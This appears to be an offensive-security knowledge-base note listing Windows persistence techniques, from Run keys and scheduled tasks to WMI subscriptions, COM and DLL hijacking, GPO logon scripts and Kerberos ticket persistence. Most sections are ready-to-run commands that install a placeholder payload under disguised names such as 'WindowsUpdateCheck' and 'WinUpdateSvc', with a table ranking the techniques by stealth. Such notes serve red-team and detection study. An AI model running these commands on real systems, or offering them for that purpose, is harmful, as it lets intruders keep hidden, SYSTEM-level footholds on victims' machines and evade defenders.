#windows #persistence #privesc

# Windows Persistence Mechanisms

Related: [privesc](privesc.md) · [privesc-tradecraft](../Detection/privesc-tradecraft.md) · [powershell-management](../AD/powershell-management.md)

## Contents
- [Registry Run Keys](#registry-run-keys)
- [Scheduled Tasks](#scheduled-tasks)
- [Services](#services)
- [WMI Event Subscription](#wmi-event-subscription)
- [Startup Folder](#startup-folder)
- [DLL Hijacking (as Persistence)](#dll-hijacking-as-persistence)
- [COM Hijacking](#com-hijacking)
- [Logon Scripts / GPO](#logon-scripts--gpo)
- [Golden/Silver Tickets & AD-level Persistence](#goldensilver-tickets--ad-level-persistence)

Quick comparison of the mechanisms below:

| Mechanism | Admin required? | Trigger | Stealth |
|---|---|---|---|
| Registry Run key (HKCU) | No | Logon | Low — well-monitored key |
| Registry Run key (HKLM) | Yes | Boot/logon (any user) | Low |
| Scheduled Task | Yes (for `/ru SYSTEM`) | Logon / interval | Medium |
| Service | Yes | Boot | Medium |
| WMI Event Subscription | Depends on scope | WQL event match | High — fileless, no schtasks/services.msc entry |
| Startup Folder | No (per-user) | Logon | Low |
| DLL Hijacking | No | Target process launch | High — blends in with legitimate process |
| COM Hijacking (HKCU) | No | COM object instantiation | High — HKCU wins over HKLM silently |
| GPO Logon Script | Domain rights | Logon (OU-wide) | Medium — scales to every machine in the OU |
| Golden/Silver Ticket | DC compromise | N/A (ticket forgery) | Highest value — survives individual password resets |

## Registry Run Keys
```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Users\Public\payload.exe"
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Windows\Temp\payload.exe"
```
HKCU fires on that user's logon (no admin needed); HKLM fires for every user on boot/logon (needs admin). Also check `RunOnce` (fires once then self-deletes) and the `Winlogon\Shell`/`Userinit` keys.

## Scheduled Tasks
```cmd
schtasks /create /tn "WindowsUpdateCheck" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru SYSTEM
schtasks /create /tn "Maintenance" /tr "C:\Windows\Temp\payload.exe" /sc minute /mo 30
```
`/ru SYSTEM` runs it as SYSTEM regardless of who's logged in (requires admin to create); `/sc minute /mo 30` re-triggers every 30 minutes for a durable callback.

## Services
```cmd
sc create WinUpdateSvc binPath= "C:\Windows\Temp\payload.exe" start= auto
sc start WinUpdateSvc
```
A malicious service starts on boot as SYSTEM by default. Also check `sc config <existing-service> binPath= "..."` on a weakly-ACL'd existing service — no new service to spot, just a hijacked one.

## WMI Event Subscription
```powershell
$trigger = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{EventNamespace='root\cimv2';QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name="Updater";CommandLineTemplate="C:\Windows\Temp\payload.exe"}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$trigger;Consumer=$consumer}
```
Fileless, survives reboots, and doesn't show up in `schtasks`/`services.msc` — fires the consumer whenever the filter's WQL query matches. Favored for stealth over Run keys/scheduled tasks.

## Startup Folder
```cmd
copy payload.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
copy payload.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```
Per-user vs. all-users startup folder — anything here runs at logon, no registry/task/service artifacts to find.

## DLL Hijacking (as Persistence)
```powershell
Get-Process | Select-Object -ExpandProperty Modules | Where-Object {$_.FileName -notlike "C:\Windows\*"}
```
Find a legitimate, frequently-run process loading a DLL from a writable non-system path, then drop a malicious DLL with the same name there — it loads automatically every time that process starts. See [process-injection](process-injection.md) and [privesc-tradecraft](../Detection/privesc-tradecraft.md) for the detection side of this.

## COM Hijacking
```powershell
reg query "HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32"
reg add "HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32" /ve /d "C:\Windows\Temp\payload.dll" /f
```
Overwrite a COM object's registration under HKCU (no admin needed, HKCU takes precedence over HKLM for the same CLSID) so any application instantiating that COM object loads your DLL instead.

## Logon Scripts / GPO
```powershell
Set-GPLink -Name "Default Domain Policy" -Target "OU=Workstations,DC=domain,DC=local"
```
With sufficient domain rights, pushing a malicious logon script via GPO persists across every machine/user in the linked OU — see [dacl-attacks](../AD/dacl-attacks.md) for the privilege path to get there.

## Golden/Silver Tickets & AD-level Persistence
Covered in depth in [kerberos-tickets](../AD/kerberos-tickets.md) and [dcsync](../AD/dcsync.md) — krbtgt-hash-based persistence survives individual password resets and is the highest-value domain-level persistence mechanism.
